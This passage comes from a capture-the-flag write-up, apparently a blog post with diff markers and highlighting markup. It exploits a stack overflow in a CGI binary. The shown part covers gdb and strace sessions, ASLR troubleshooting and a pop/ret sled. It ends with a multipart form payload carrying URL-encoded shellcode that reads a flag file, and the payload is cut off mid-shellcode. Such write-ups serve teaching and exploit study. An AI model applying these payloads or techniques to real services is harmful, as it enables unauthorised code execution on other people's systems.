+<span class='mh'>0xb7fcd000</span> <span class='mh'>0xb7fcf000</span> <span class='n'>r</span><span class='o'>-</span><span class='n'>xp</span>      <span class='o'>/</span><span class='n'>lib</span><span class='o'>/</span><span class='n'>i386</span><span class='o'>-</span><span class='n'>linux</span><span class='o'>-</span><span class='n'>gnu</span><span class='o'>/</span><span class='n'>libc</span><span class='o'>-</span><span class='mf'>2.17</span><span class='o'>.</span><span class='na'>so</span>
+<span class='mh'>0xb7fcf000</span> <span class='mh'>0xb7fd0000</span> <span class='n'>rwxp</span>      <span class='o'>/</span><span class='n'>lib</span><span class='o'>/</span><span class='n'>i386</span><span class='o'>-</span><span class='n'>linux</span><span class='o'>-</span><span class='n'>gnu</span><span class='o'>/</span><span class='n'>libc</span><span class='o'>-</span><span class='mf'>2.17</span><span class='o'>.</span><span class='na'>so</span>
+<span class='mh'>0xb7fd0000</span> <span class='mh'>0xb7fd3000</span> <span class='n'>rwxp</span>      <span class='n'>mapped</span>
+<span class='mh'>0xb7fd9000</span> <span class='mh'>0xb7fdd000</span> <span class='n'>rwxp</span>      <span class='n'>mapped</span>
+<span class='mh'>0xb7fdd000</span> <span class='mh'>0xb7fde000</span> <span class='n'>r</span><span class='o'>-</span><span class='n'>xp</span>      <span class='o'>[</span><span class='n'>vdso</span><span class='o'>]</span>
+<span class='mh'>0xb7fde000</span> <span class='mh'>0xb7ffe000</span> <span class='n'>r</span><span class='o'>-</span><span class='n'>xp</span>      <span class='o'>/</span><span class='n'>lib</span><span class='o'>/</span><span class='n'>i386</span><span class='o'>-</span><span class='n'>linux</span><span class='o'>-</span><span class='n'>gnu</span><span class='o'>/</span><span class='n'>ld</span><span class='o'>-</span><span class='mf'>2.17</span><span class='o'>.</span><span class='na'>so</span>
+<span class='mh'>0xb7ffe000</span> <span class='mh'>0xb7fff000</span> <span class='n'>r</span><span class='o'>-</span><span class='n'>xp</span>      <span class='o'>/</span><span class='n'>lib</span><span class='o'>/</span><span class='n'>i386</span><span class='o'>-</span><span class='n'>linux</span><span class='o'>-</span><span class='n'>gnu</span><span class='o'>/</span><span class='n'>ld</span><span class='o'>-</span><span class='mf'>2.17</span><span class='o'>.</span><span class='na'>so</span>
+<span class='mh'>0xb7fff000</span> <span class='mh'>0xb8000000</span> <span class='n'>rwxp</span>      <span class='o'>/</span><span class='n'>lib</span><span class='o'>/</span><span class='n'>i386</span><span class='o'>-</span><span class='n'>linux</span><span class='o'>-</span><span class='n'>gnu</span><span class='o'>/</span><span class='n'>ld</span><span class='o'>-</span><span class='mf'>2.17</span><span class='o'>.</span><span class='na'>so</span>
+<span class='mh'>0xbffdf000</span> <span class='mh'>0xc0000000</span> <span class='n'>rwxp</span>      <span class='o'>[</span><span class='n'>stack</span><span class='o'>]</span>
+</code></pre></div>
+<p>I have three choices for direct execution: heap, mapped, or stack. All of the sections are executable. If I run the binary again and do the same search we can determine if any of these sections are affected by ASLR. They all looked stable between runs to me. Remember this for later.</p>
+
+<p>My preference is to use the mapped section because it looks like it has a complete copy of the data exactly as I sent it in. Other options here are to look for more input vectors, specifically cookies and other variables. Let’s use python again to set the “AAAA” in our input to \xcc\xcc\xcc\xcc so that we might trigger an int 3 debugging break point.</p>
+
+<p>Next, let’s overwrite the “MMNN” offset that was in EIP with the little endian URL encoded address of %08%a1%fd%b7 (0xb7fda108) that should point directly to the start of our data (int 3) in the mapped section. If all goes well, we should expect to see a SIGTRAP.</p>
+
+<p>The formdata file is:</p>
+<div class='highlight'><pre><code class='java'><span class='n'>$</span> <span class='n'>cat</span> <span class='n'>formdata</span>
+<span class='o'>-----------------------------</span><span class='mi'>13141138687192</span>
+<span class='n'>Content</span><span class='o'>-</span><span class='nl'>Disposition:</span> <span class='n'>form</span><span class='o'>-</span><span class='n'>data</span><span class='o'>;</span> <span class='n'>name</span><span class='o'>=</span><span class='s'>&quot;photo&quot;</span><span class='o'>;</span> <span class='n'>filename</span><span class='o'>=</span><span class='s'>&quot;%25Time%25&quot;</span>
+<span class='n'>Content</span><span class='o'>-</span><span class='nl'>Type:</span> <span class='n'>application</span><span class='o'>/</span><span class='n'>octet</span><span class='o'>-</span><span class='n'>stream</span>
+
+<span class='n'>file</span> <span class='n'>contents</span>
+
+<span class='o'>-----------------------------</span><span class='mi'>13141138687192</span>
+<span class='n'>Content</span><span class='o'>-</span><span class='nl'>Disposition:</span> <span class='n'>form</span><span class='o'>-</span><span class='n'>data</span><span class='o'>;</span> <span class='n'>name</span><span class='o'>=</span><span class='s'>&quot;time&quot;</span>
+
+<span class='err'>▒▒▒▒</span><span class='n'>BBBBCCCCDDDDEEEEFF</span><span class='o'>%</span><span class='mi'>25</span><span class='o'>%</span><span class='mi'>30</span><span class='o'>%</span><span class='mi'>30</span><span class='o'>%</span><span class='mi'>25</span><span class='o'>%</span><span class='mi'>30</span><span class='o'>%</span><span class='mi'>30</span><span class='o'>%</span><span class='mi'>25</span><span class='o'>%</span><span class='mi'>30</span><span class='o'>%</span><span class='mi'>30</span><span class='o'>%</span><span class='mi'>25</span><span class='o'>%</span><span class='mi'>30</span><span class='o'>%</span><span class='mi'>30</span><span class='n'>GGHHHHIIIIJJJJKKKKLLLLMM</span><span class='o'>%</span><span class='mi'>08</span><span class='o'>%</span><span class='n'>a1</span><span class='o'>%</span><span class='n'>fd</span><span class='o'>%</span><span class='n'>b7</span><span class='o'>%</span><span class='n'>EC</span><span class='o'>%</span><span class='n'>F0</span><span class='o'>%</span><span class='mi'>04</span><span class='o'>%</span><span class='mi'>08</span><span class='n'>OOPPPP</span>
+<span class='o'>-----------------------------</span><span class='mi'>13141138687192</span><span class='err'>—</span>
+</code></pre></div>
+<p>The debugger output is:</p>
+<div class='highlight'><pre><code class='java'><span class='n'>$</span> <span class='n'>gdb</span> <span class='o'>./</span><span class='n'>nonameyet</span><span class='o'>.</span><span class='na'>cgi</span>
+<span class='n'>Reading</span> <span class='n'>symbols</span> <span class='n'>from</span> <span class='o'>./</span><span class='n'>nonameyet</span><span class='o'>.</span><span class='na'>cgi</span><span class='o'>...(</span><span class='n'>no</span> <span class='n'>debugging</span> <span class='n'>symbols</span> <span class='n'>found</span><span class='o'>)...</span><span class='na'>done</span><span class='o'>.</span>
+<span class='n'>gdb</span><span class='o'>-</span><span class='n'>peda$</span> <span class='n'>set</span> <span class='n'>args</span> <span class='o'>&lt;</span> <span class='n'>formdata</span>
+<span class='n'>gdb</span><span class='o'>-</span><span class='n'>peda$</span> <span class='n'>r</span>
+<span class='n'>Starting</span> <span class='nl'>program:</span> <span class='o'>/</span><span class='n'>home</span><span class='o'>/</span><span class='n'>bool</span><span class='o'>/</span><span class='n'>nonameyet</span><span class='o'>.</span><span class='na'>cgi</span> <span class='o'>&lt;</span> <span class='n'>formdata</span>
+
+<span class='n'>Program</span> <span class='n'>received</span> <span class='n'>signal</span> <span class='n'>SIGTRAP</span><span class='o'>,</span> <span class='n'>Trace</span><span class='o'>/</span><span class='n'>breakpoint</span> <span class='n'>trap</span><span class='o'>.</span>
+<span class='o'>[----------------------------------</span><span class='n'>registers</span><span class='o'>-----------------------------------]</span>
+<span class='nl'>EAX:</span> <span class='mh'>0x0</span>
+<span class='nl'>EBX:</span> <span class='mh'>0x804f0ec</span> <span class='o'>--&gt;</span> <span class='mh'>0xb7fd9000</span> <span class='o'>--&gt;</span> <span class='mh'>0x0</span>
+<span class='nl'>ECX:</span> <span class='mh'>0x0</span>
+<span class='nl'>EDX:</span> <span class='mh'>0x80500a6</span> <span class='o'>--&gt;</span> <span class='mh'>0x0</span>
+<span class='nl'>ESI:</span> <span class='mh'>0x48484747</span> <span class='o'>(</span><span class='err'>&#39;</span><span class='n'>GGHH</span><span class='err'>&#39;</span><span class='o'>)</span>
+<span class='nl'>EDI:</span> <span class='mh'>0xb7fd9000</span> <span class='o'>--&gt;</span> <span class='mh'>0x0</span>
+<span class='nl'>EBP:</span> <span class='mh'>0x4d4d4c4c</span> <span class='o'>(</span><span class='err'>&#39;</span><span class='n'>LLMM</span><span class='err'>&#39;</span><span class='o'>)</span>
+<span class='nl'>ESP:</span> <span class='mh'>0xbffff640</span> <span class='o'>--&gt;</span> <span class='mh'>0x804f0ec</span> <span class='o'>--&gt;</span> <span class='mh'>0xb7fd9000</span> <span class='o'>--&gt;</span> <span class='mh'>0x0</span>
+<span class='nl'>EIP:</span> <span class='mh'>0xb7fda109</span> <span class='o'>--&gt;</span> <span class='mh'>0x42cccccc</span>
+<span class='nl'>EFLAGS:</span> <span class='mh'>0x206</span> <span class='o'>(</span><span class='n'>carry</span> <span class='n'>PARITY</span> <span class='n'>adjust</span> <span class='n'>zero</span> <span class='n'>sign</span> <span class='n'>trap</span> <span class='n'>INTERRUPT</span> <span class='n'>direction</span> <span class='n'>overflow</span><span class='o'>)</span>
+<span class='o'>[-------------------------------------</span><span class='n'>code</span><span class='o'>-------------------------------------]</span>
+   <span class='mh'>0xb7fda0fc</span><span class='o'>:</span>  <span class='n'>gs</span>
+   <span class='mh'>0xb7fda0fd</span><span class='o'>:</span>  <span class='n'>cmp</span>    <span class='n'>eax</span><span class='o'>,</span><span class='mh'>0x6d697422</span>
+   <span class='mh'>0xb7fda102</span><span class='o'>:</span>  <span class='n'>and</span>    <span class='n'>cl</span><span class='o'>,</span><span class='n'>BYTE</span> <span class='n'>PTR</span> <span class='nl'>gs:</span><span class='mh'>0xcc0a0d0a</span>
+<span class='o'>=&gt;</span> <span class='mh'>0xb7fda109</span><span class='o'>:</span>  <span class='n'>int3</span>
+   <span class='mh'>0xb7fda10a</span><span class='o'>:</span>  <span class='n'>int3</span>
+   <span class='mh'>0xb7fda10b</span><span class='o'>:</span>  <span class='n'>int3</span>
+   <span class='mh'>0xb7fda10c</span><span class='o'>:</span>  <span class='n'>inc</span>    <span class='n'>edx</span>
+   <span class='mh'>0xb7fda10d</span><span class='o'>:</span>  <span class='n'>inc</span>    <span class='n'>edx</span>
+<span class='o'>[------------------------------------</span><span class='n'>stack</span><span class='o'>-------------------------------------]</span>
+<span class='mi'>0000</span><span class='o'>|</span> <span class='mh'>0xbffff640</span> <span class='o'>--&gt;</span> <span class='mh'>0x804f0ec</span> <span class='o'>--&gt;</span> <span class='mh'>0xb7fd9000</span> <span class='o'>--&gt;</span> <span class='mh'>0x0</span>
+<span class='mi'>0004</span><span class='o'>|</span> <span class='mh'>0xbffff644</span> <span class='o'>(</span><span class='s'>&quot;OOPPPP&quot;</span><span class='o'>)</span>
+<span class='mi'>0008</span><span class='o'>|</span> <span class='mh'>0xbffff648</span> <span class='o'>--&gt;</span> <span class='mh'>0xff005050</span>
+<span class='mi'>0012</span><span class='o'>|</span> <span class='mh'>0xbffff64c</span> <span class='o'>--&gt;</span> <span class='mh'>0x1</span>
+<span class='mi'>0016</span><span class='o'>|</span> <span class='mh'>0xbffff650</span> <span class='o'>--&gt;</span> <span class='mh'>0xb7e2bb98</span> <span class='o'>--&gt;</span> <span class='mh'>0x2a5c</span> <span class='o'>(</span><span class='err'>&#39;\\</span><span class='o'>*</span><span class='err'>&#39;</span><span class='o'>)</span>
+<span class='mi'>0020</span><span class='o'>|</span> <span class='mh'>0xbffff654</span> <span class='o'>--&gt;</span> <span class='mh'>0xb7fdc858</span> <span class='o'>--&gt;</span> <span class='mh'>0xb7e1f000</span> <span class='o'>--&gt;</span> <span class='mh'>0x464c457f</span>
+<span class='mi'>0024</span><span class='o'>|</span> <span class='mh'>0xbffff658</span> <span class='o'>--&gt;</span> <span class='mh'>0xbffff866</span> <span class='o'>(</span><span class='s'>&quot;/home/bool/nonameyet.cgi&quot;</span><span class='o'>)</span>
+<span class='mi'>0028</span><span class='o'>|</span> <span class='mh'>0xbffff65c</span> <span class='o'>--&gt;</span> <span class='mh'>0x80500a0</span> <span class='o'>(</span><span class='s'>&quot;%Time%&quot;</span><span class='o'>)</span>
+<span class='o'>[------------------------------------------------------------------------------]</span>
+<span class='nl'>Legend:</span> <span class='n'>code</span><span class='o'>,</span> <span class='n'>data</span><span class='o'>,</span> <span class='n'>rodata</span><span class='o'>,</span> <span class='n'>value</span>
+<span class='n'>Stopped</span> <span class='nl'>reason:</span> <span class='n'>SIGTRAP</span>
+<span class='mh'>0xb7fda109</span> <span class='n'>in</span> <span class='o'>??</span> <span class='o'>()</span>
+<span class='n'>gdb</span><span class='o'>-</span><span class='n'>peda$</span>
+</code></pre></div>
+<p>Great! We have arbitrary code execution now. Unfortunately, the start of our string only affords us 22 bytes of execution before we run into the NULL encoded ECX register from earlier. We now have two options. The first is to make the filename larger than %25Time%25 so that more stack is allocated and our offsets are further into the file. The second option I see is to encode a short relative jump instruction in place of the int 3. Because we are doing this from a flat file and not an exploit script it would be very easy to lose track of shifting offsets, so I opted for the second option.</p>
+
+<p>Currently, the start of the “OOPP” that ends our input string is 105 bytes away. I can encode a jump as %eb%67 to jump +105 bytes forward and land right on my data. After a bit of trial and error building the input file I was able to line everything up just right and gain code execution when running in gdb. I simply replaced the “OOPPPP” with my shellcode to open /home/nonameyet/flag, read it to the stack, and write it to stdout. Note that this shellcode would not trigger the .bash_alias backdoor from earlier!</p>
+
+<p>However, when I run it outside of the debugger I get a segmentation fault. This is a common annoyance when writing exploits. Things can change when they are being debugged. I ran a strace command to see if any of the shellcode was making system calls:</p>
+<div class='highlight'><pre><code class='java'><span class='n'>$</span> <span class='o'>./</span><span class='n'>nonameyet</span><span class='o'>.</span><span class='na'>cgi</span> <span class='o'>&lt;</span> <span class='n'>formdata2</span>
+<span class='err'>…</span>
+<span class='n'>old_mmap</span><span class='o'>(</span><span class='n'>NULL</span><span class='o'>,</span> <span class='mi'>4096</span><span class='o'>,</span> <span class='n'>PROT_READ</span><span class='o'>|</span><span class='n'>PROT_WRITE</span><span class='o'>,</span> <span class='n'>MAP_PRIVATE</span><span class='o'>|</span><span class='n'>MAP_ANONYMOUS</span><span class='o'>,</span> <span class='mi'>0</span><span class='o'>,</span> <span class='mi'>0</span><span class='o'>)</span> <span class='o'>=</span> <span class='mh'>0xb76ff000</span>
+<span class='o'>---</span> <span class='n'>SIGSEGV</span> <span class='o'>{</span><span class='n'>si_signo</span><span class='o'>=</span><span class='n'>SIGSEGV</span><span class='o'>,</span> <span class='n'>si_code</span><span class='o'>=</span><span class='n'>SEGV_MAPERR</span><span class='o'>,</span> <span class='n'>si_addr</span><span class='o'>=</span><span class='mh'>0xb7fda108</span><span class='o'>}</span> <span class='o'>---</span>
+<span class='o'>+++</span> <span class='n'>killed</span> <span class='n'>by</span> <span class='n'>SIGSEGV</span> <span class='o'>(</span><span class='n'>core</span> <span class='n'>dumped</span><span class='o'>)</span> <span class='o'>+++</span>
+</code></pre></div>
+<p>Nope, I never got execution. With si_addr=0xb7fda108 I am at least still jumping to the correct spot. What I notice is that the mmap call is returning 0xb76ff000. This is not what I was seeing as a consistent address for my data on the 0xb7fda000 page. So, that address does not exist and we need to go back to pick one of the other two points where we have code. Let’s pick the heap this time with an address of 0x080501b8 as our new EIP.</p>
+
+<p>After modifying the formdata file again and setting a break point on the return from the interesting function, it looks like the heap address has moved as well. It is now at [heap] : 0x8050318 (“AAAABBBBCCCCDDDDEEEEFF”). I suggest that this changed because our input lengths have changed since I last looked. I’ve added shellcode now after all.</p>
+
+<p>The base address for the heap is still in the same spot: 0x08050000. It is just the offset within that page that has shifted. Let’s put in the new address for EIP and try our luck with yet another run. The other thing that is different about this heap location is that all of our data has already been URL decoded. Thus, we will need to URL encode all of our binary values. This includes the shellcode.</p>
+
+<p>This time it hits a SIGTRAP again and we can redo our relative short jump calculation jump to land on arbitrary shellcode. We are executing at 0x08050318 and we need to jump to 0x08050352, or 58 bytes away, which means we should us an opcode of “\xeb\x38”. Setting this at the start jumps perfectly to our shellcode, which now executes just fine in the debugger. Again.</p>
+
+<p>But, once again, running without the debugger attached produces a crash! It appears that the heap moves as well. This makes logical sense. If the mmap call is moving and the heap is allocated in a similar way, then they both should move with ASLR. We could try the stack location by building in a large NOP (\x90) sled before our shellcode and go about guessing stack addresses despite ASLR, brute forcing the return address used for EIP. I’ve shamefully used this technique in past CTF events with success.</p>
+
+<p>The whole problem here, and the reason I’ve failed to exploit twice, is that GDB has disabled ASLR. Remember when I checked it earlier? I could have saved myself a lot of time if I had realized this back then. While having your debugger turn off ASLR makes debugging easier, it leads to false hope. Let this be a lesson to always run the set disable-randomization off command in GDB when starting exploit development on a binary. I believe this default ASLR disabled state is actually coming from the PEDA GDB init script I am using. I have another idea that should work with ASLR.</p>
+
+<p>Remember that data structure passed into the interesting function? Well, there is no reason why we only have to fill out the “filename” and “time” variables. If we set the “date” variable there will be a pointer to the date value on the stack. We can put our shellcode in there and use a technique called a return sled to get down the stack.</p>
+
+<p>Here is a short debugging session showing the stack at the beginning of the interesting function:</p>
+<div class='highlight'><pre><code class='java'><span class='n'>$</span> <span class='n'>gdb</span> <span class='o'>./</span><span class='n'>nonameyet</span><span class='o'>.</span><span class='na'>cgi</span>
+<span class='n'>Reading</span> <span class='n'>symbols</span> <span class='n'>from</span> <span class='o'>./</span><span class='n'>nonameyet</span><span class='o'>.</span><span class='na'>cgi</span><span class='o'>...(</span><span class='n'>no</span> <span class='n'>debugging</span> <span class='n'>symbols</span> <span class='n'>found</span><span class='o'>)...</span><span class='na'>done</span><span class='o'>.</span>
+<span class='n'>gdb</span><span class='o'>-</span><span class='n'>peda$</span> <span class='k'>break</span> <span class='o'>*</span><span class='mh'>0x0804CE3B</span>
+<span class='n'>Breakpoint</span> <span class='mi'>1</span> <span class='n'>at</span> <span class='mh'>0x804ce3b</span>
+<span class='n'>gdb</span><span class='o'>-</span><span class='n'>peda$</span> <span class='n'>set</span> <span class='n'>args</span> <span class='o'>&lt;</span> <span class='n'>formdata3</span>
+<span class='n'>gdb</span><span class='o'>-</span><span class='n'>peda$</span> <span class='n'>r</span>
+
+<span class='n'>Breakpoint</span> <span class='mi'>1</span><span class='o'>,</span> <span class='mh'>0x0804ce3b</span> <span class='n'>in</span> <span class='o'>??</span> <span class='o'>()</span>
+<span class='n'>gdb</span><span class='o'>-</span><span class='n'>peda$</span> <span class='n'>stack</span> <span class='mi'>20</span>
+<span class='mi'>0000</span><span class='o'>|</span> <span class='mh'>0xbffff63c</span> <span class='o'>--&gt;</span> <span class='mh'>0x80492eb</span> <span class='o'>(</span><span class='n'>test</span>   <span class='n'>eax</span><span class='o'>,</span><span class='n'>eax</span><span class='o'>)</span> <span class='err'>#</span> <span class='k'>return</span> <span class='n'>address</span> <span class='n'>in</span> <span class='n'>main</span><span class='o'>()</span>
+<span class='mi'>0004</span><span class='o'>|</span> <span class='mh'>0xbffff640</span> <span class='o'>--&gt;</span> <span class='mh'>0xbffff65c</span> <span class='o'>--&gt;</span> <span class='mh'>0x80500a0</span> <span class='o'>(</span><span class='s'>&quot;%Time%&quot;</span><span class='o'>)</span>
+<span class='mi'>0008</span><span class='o'>|</span> <span class='mh'>0xbffff644</span> <span class='o'>--&gt;</span> <span class='mh'>0xbffff68c</span> <span class='o'>--&gt;</span> <span class='mh'>0xe</span>
+<span class='mi'>0012</span><span class='o'>|</span> <span class='mh'>0xbffff648</span> <span class='o'>--&gt;</span> <span class='mh'>0xffffffff</span>
+<span class='mi'>0016</span><span class='o'>|</span> <span class='mh'>0xbffff64c</span> <span class='o'>--&gt;</span> <span class='mh'>0x1</span>
+<span class='mi'>0020</span><span class='o'>|</span> <span class='mh'>0xbffff650</span> <span class='o'>--&gt;</span> <span class='mh'>0xb7e2bb98</span> <span class='o'>--&gt;</span> <span class='mh'>0x2a5c</span> <span class='o'>(</span><span class='err'>&#39;\\</span><span class='o'>*</span><span class='err'>&#39;</span><span class='o'>)</span>
+<span class='mi'>0024</span><span class='o'>|</span> <span class='mh'>0xbffff654</span> <span class='o'>--&gt;</span> <span class='mh'>0xb7fdc858</span> <span class='o'>--&gt;</span> <span class='mh'>0xb7e1f000</span> <span class='o'>--&gt;</span> <span class='mh'>0x464c457f</span>
+<span class='mi'>0028</span><span class='o'>|</span> <span class='mh'>0xbffff658</span> <span class='o'>--&gt;</span> <span class='mh'>0xbffff866</span> <span class='o'>(</span><span class='s'>&quot;/home/bool/nonameyet.cgi&quot;</span><span class='o'>)</span>
+<span class='mi'>0032</span><span class='o'>|</span> <span class='mh'>0xbffff65c</span> <span class='o'>--&gt;</span> <span class='mh'>0x80500a0</span> <span class='o'>(</span><span class='s'>&quot;%Time%&quot;</span><span class='o'>)</span>
+<span class='mi'>0036</span><span class='o'>|</span> <span class='mh'>0xbffff660</span> <span class='o'>--&gt;</span> <span class='mh'>0x7</span>
+<span class='mi'>0040</span><span class='o'>|</span> <span class='mh'>0xbffff664</span> <span class='o'>--&gt;</span> <span class='mh'>0x0</span>
+<span class='mi'>0044</span><span class='o'>|</span> <span class='mh'>0xbffff668</span> <span class='o'>--&gt;</span> <span class='mh'>0x0</span>
+<span class='mi'>0048</span><span class='o'>|</span> <span class='mh'>0xbffff66c</span> <span class='o'>--&gt;</span> <span class='mh'>0x80501b8</span> <span class='o'>--&gt;</span> <span class='mh'>0x414138eb</span>   <span class='err'>#</span> <span class='k'>this</span> <span class='n'>is</span> <span class='n'>the</span> <span class='n'>time</span> <span class='n'>variable</span>
+<span class='mi'>0052</span><span class='o'>|</span> <span class='mh'>0xbffff670</span> <span class='o'>--&gt;</span> <span class='mh'>0x3b</span> <span class='o'>(</span><span class='sc'>&#39;;&#39;</span><span class='o'>)</span>                 <span class='err'>#</span> <span class='n'>time</span> <span class='n'>variable</span> <span class='n'>length</span>
+<span class='mi'>0056</span><span class='o'>|</span> <span class='mh'>0xbffff674</span> <span class='o'>--&gt;</span> <span class='mh'>0x8050348</span> <span class='o'>--&gt;</span> <span class='mh'>0xf0ec8166</span>   <span class='err'>#</span> <span class='n'>date</span> <span class='n'>variable</span>
+<span class='mi'>0060</span><span class='o'>|</span> <span class='mh'>0xbffff678</span> <span class='o'>--&gt;</span> <span class='mh'>0x54</span> <span class='o'>(</span><span class='sc'>&#39;T&#39;</span><span class='o'>)</span>                 <span class='err'>#</span> <span class='n'>date</span> <span class='n'>variable</span> <span class='n'>length</span>
+<span class='mi'>0064</span><span class='o'>|</span> <span class='mh'>0xbffff67c</span> <span class='o'>--&gt;</span> <span class='mh'>0x0</span>
+<span class='mi'>0068</span><span class='o'>|</span> <span class='mh'>0xbffff680</span> <span class='o'>--&gt;</span> <span class='mh'>0x0</span>
+<span class='mi'>0072</span><span class='o'>|</span> <span class='mh'>0xbffff684</span> <span class='o'>--&gt;</span> <span class='mh'>0x0</span>
+<span class='mi'>0076</span><span class='o'>|</span> <span class='mh'>0xbffff688</span> <span class='o'>--&gt;</span> <span class='mh'>0x0</span>
+<span class='n'>gdb</span><span class='o'>-</span><span class='n'>peda$</span>
+</code></pre></div>
+<p>If we replace our original return address with 0x08048945 (the address of a ret instruction) and then immediately following this address place the same address again, the program will return twice and the stack will be incremented by 8. We can do this all the way down the stack until we reach our pointer to the date variable. A little math tells us (0xbffff674 - 0xbffff63c) / 4 that we need to put the pointer to the ret instruction on the stack 14 times to reach the pointer to our shellcode.</p>
+
+<p>One problem. When I go to edit the time variable I see that we have &l;teip&gt; then &lt;bss&gt; address in the time variable. This was required to survive the write from earlier. I will not be able to write to the text section of the binary so I cannot use this address for the ret sled. Because the number of addresses is even, I can point the return sled to a pop ret gadget and have a pop/ret sled instead. There is a pop just one byte before the previous ret address at 0x08048944. I will still need to put this address in 14 times but every other instance will not be executed.</p>
+
+<p>My first attempt at this failed as well! When I looked at the stack, the pointer for the “date” variable was not where it should be. The length was correct but we were returning into NULLs. Looking a little closer, I noticed that the pointer for this variable ended with 0x00. Of course, the time variable was null terminating on the stack. My length was off by one. Since I am already doing a pop/ret sled the pointer immediately before the date pointer is not executed. It could really be anything. I made the time variable one byte shorter and FINALLY gained code execution outside of a debugger. Here is the completed formdata file and execution printing out /home/nonameyet/flag:</p>
+<div class='highlight'><pre><code class='java'><span class='n'>$</span> <span class='n'>cat</span> <span class='n'>formdata</span>
+<span class='o'>-----------------------------</span><span class='mi'>13141138687192</span>
+<span class='n'>Content</span><span class='o'>-</span><span class='nl'>Disposition:</span> <span class='n'>form</span><span class='o'>-</span><span class='n'>data</span><span class='o'>;</span> <span class='n'>name</span><span class='o'>=</span><span class='s'>&quot;photo&quot;</span><span class='o'>;</span> <span class='n'>filename</span><span class='o'>=</span><span class='s'>&quot;%25Time%25&quot;</span>
+<span class='n'>Content</span><span class='o'>-</span><span class='nl'>Type:</span> <span class='n'>application</span><span class='o'>/</span><span class='n'>octet</span><span class='o'>-</span><span class='n'>stream</span>
+
+<span class='n'>file</span> <span class='n'>contents</span>
+
+<span class='o'>-----------------------------</span><span class='mi'>13141138687192</span>
+<span class='n'>Content</span><span class='o'>-</span><span class='nl'>Disposition:</span> <span class='n'>form</span><span class='o'>-</span><span class='n'>data</span><span class='o'>;</span> <span class='n'>name</span><span class='o'>=</span><span class='s'>&quot;time&quot;</span>
+
+<span class='o'>%</span><span class='n'>eb</span><span class='o'>%</span><span class='mi'>38</span><span class='n'>AABBBBCCCCDDDDEEEEFF</span><span class='o'>%</span><span class='mi'>25</span><span class='o'>%</span><span class='mi'>30</span><span class='o'>%</span><span class='mi'>30</span><span class='o'>%</span><span class='mi'>25</span><span class='o'>%</span><span class='mi'>30</span><span class='o'>%</span><span class='mi'>30</span><span class='o'>%</span><span class='mi'>25</span><span class='o'>%</span><span class='mi'>30</span><span class='o'>%</span><span class='mi'>30</span><span class='o'>%</span><span class='mi'>25</span><span class='o'>%</span><span class='mi'>30</span><span class='o'>%</span><span class='mi'>30</span><span class='n'>GGHHHHIIIIJJJJKKKKLLLLMM</span><span class='o'>%</span><span class='mi'>44</span><span class='o'>%</span><span class='mi'>89</span><span class='o'>%</span><span class='mi'>04</span><span class='o'>%</span><span class='mi'>08</span><span class='o'>%</span><span class='n'>EC</span><span class='o'>%</span><span class='n'>F0</span><span class='o'>%</span><span class='mi'>04</span><span class='o'>%</span><span class='mi'>08</span><span class='o'>%</span><span class='mi'>44</span><span class='o'>%</span><span class='mi'>89</span><span class='o'>%</span><span class='mi'>04</span><span class='o'>%</span><span class='mi'>08</span><span class='o'>%</span><span class='mi'>44</span><span class='o'>%</span><span class='mi'>89</span><span class='o'>%</span><span class='mi'>04</span><span class='o'>%</span><span class='mi'>08</span><span class='o'>%</span><span class='mi'>44</span><span class='o'>%</span><span class='mi'>89</span><span class='o'>%</span><span class='mi'>04</span><span class='o'>%</span><span class='mi'>08</span><span class='o'>%</span><span class='mi'>44</span><span class='o'>%</span><span class='mi'>89</span><span class='o'>%</span><span class='mi'>04</span><span class='o'>%</span><span class='mi'>08</span><span class='o'>%</span><span class='mi'>44</span><span class='o'>%</span><span class='mi'>89</span><span class='o'>%</span><span class='mi'>04</span><span class='o'>%</span><span class='mi'>08</span><span class='o'>%</span><span class='mi'>44</span><span class='o'>%</span><span class='mi'>89</span><span class='o'>%</span><span class='mi'>04</span><span class='o'>%</span><span class='mi'>08</span><span class='o'>%</span><span class='mi'>44</span><span class='o'>%</span><span class='mi'>89</span><span class='o'>%</span><span class='mi'>04</span><span class='o'>%</span><span class='mi'>08</span><span class='o'>%</span><span class='mi'>44</span><span class='o'>%</span><span class='mi'>89</span><span class='o'>%</span><span class='mi'>04</span><span class='o'>%</span><span class='mi'>08</span><span class='o'>%</span><span class='mi'>44</span><span class='o'>%</span><span class='mi'>89</span><span class='o'>%</span><span class='mi'>04</span><span class='o'>%</span><span class='mi'>08</span><span class='o'>%</span><span class='mi'>44</span><span class='o'>%</span><span class='mi'>89</span><span class='o'>%</span><span class='mi'>04</span><span class='o'>%</span><span class='mi'>08</span><span class='o'>%</span><span class='mi'>44</span><span class='o'>%</span><span class='mi'>89</span><span class='o'>%</span><span class='mi'>04</span><span class='o'>%</span><span class='mi'>08</span><span class='o'>%</span><span class='mi'>44</span><span class='o'>%</span><span class='mi'>89</span><span class='o'>%</span><span class='mi'>04</span>
+<span class='o'>-----------------------------</span><span class='mi'>13141138687192</span>
+<span class='n'>Content</span><span class='o'>-</span><span class='nl'>Disposition:</span> <span class='n'>form</span><span class='o'>-</span><span class='n'>data</span><span class='o'>;</span> <span class='n'>name</span><span class='o'>=</span><span class='s'>&quot;date&quot;</span>
+
+<span class='o'>%</span><span class='mi'>66</span><span class='o'>%</span><span class='mi'>81</span><span class='o'>%</span><span class='n'>EC</span><span class='o'>%</span><span class='n'>F0</span><span class='o'>%</span><span class='mi'>01</span><span class='o'>%</span><span class='mi'>83</span><span class='o'>%</span><span class='n'>E4</span><span class='o'>%</span><span class='n'>F8</span><span class='o'>%</span><span class='n'>EB</span><span class='o'>%</span><span class='mi'>30</span><span class='o'>%</span><span class='mi'>5</span><span class='n'>E</span><span class='o'>%</span><span class='mi'>89</span><span class='o'>%</span><span class='n'>F3</span><span class='o'>%</span><span class='mi'>31</span><span class='o'>%</span><span class='n'>C9</span><span class='o'>%</span><span class='mi'>31</span><span class='o'>%</span><span class='n'>C0</span><span class='o'>%</span><span class='n'>B0</span><span class='o'>%</span><span class='mi'>05</span><span class='o'>%</span><span class='n'>CD</span><span class='o'>%</span><span class='mi'>80</span><span class='o'>%</span><span class='mi'>89</span><span class='o'>%</span><span class='n'>C3</span><span class='o'>%</span><span class='mi'>89</span><span class='o'>%</span><span class='n'>F1</span><span class='o'>%</span><span class='mi'>31</span><span class='o'>%</span><span class='n'>D2</span><span class='o'>%</span><span class='n'>B2</span><span class='o'>%</span><span class='n'>FF</span><span class='o'>%</span><span class='mi'>31</span><span class='o'>%</span><span class='n'>C0</span><span class='o'>%</span><span class='n'>B0</span><span class='o'>%</span><span class='mi'>03</span><span class='o'>%</span><span class='n'>CD</span><span class='o'>%</span><span class='mi'>80</span><span 